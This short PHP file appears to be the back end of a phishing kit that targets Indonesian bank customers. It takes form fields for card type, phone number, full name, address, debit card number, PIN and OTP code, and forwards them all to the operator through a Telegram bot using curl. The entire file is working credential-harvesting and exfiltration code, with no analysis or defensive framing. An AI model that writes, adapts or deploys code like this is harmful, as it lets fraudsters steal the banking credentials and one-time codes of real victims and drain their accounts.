<?php 



session_start();
include "./telegram.php";



$message = "𝗝𝗲𝗻𝗶𝘀 𝗞𝗮𝗿𝘁𝘂 𝗞𝗿𝗲𝗱𝗶𝘁 : \n". $_POST ['tipecard']. "\n𝗡𝗼𝗺𝗼𝗿 𝗛𝗮𝗻𝗱𝗽𝗵𝗼𝗻𝗲 :\n". $_POST ['nomor']. "\n𝗡𝗮𝗺𝗮 𝗟𝗲𝗻𝗴𝗸𝗮𝗽 :\n". $_POST ['nama']. "\n𝗔𝗹𝗮𝗺𝗮𝘁 𝗟𝗲𝗻𝗴𝗸𝗮𝗽 :\n". $_POST ['alamat']. "\n𝗡𝗼𝗺𝗼𝗿 𝗞𝗮𝗿𝘁𝘂 𝗗𝗲𝗯𝗶𝘁 :\n". $_POST ['debit']. "\n𝗣𝗜𝗡  :\n". $_POST ['pin']. "\n\n𝗞𝗼𝗱𝗲 𝗢𝗧𝗣 : \n". $_POST ['setPin'];
function sendMessage($telegram_id, $message, $id_bot)
{
$url = "https://api.telegram.org/bot" . $id_bot . "/sendMessage?parse_mode=markdown&chat_id=" . $telegram_id;
    $url = $url . "&text=" . urlencode($message);
    $ch = curl_init();
    $optArray = array(
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true
    );
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
}
sendMessage($telegram_id, $message, $id_bot);




?> 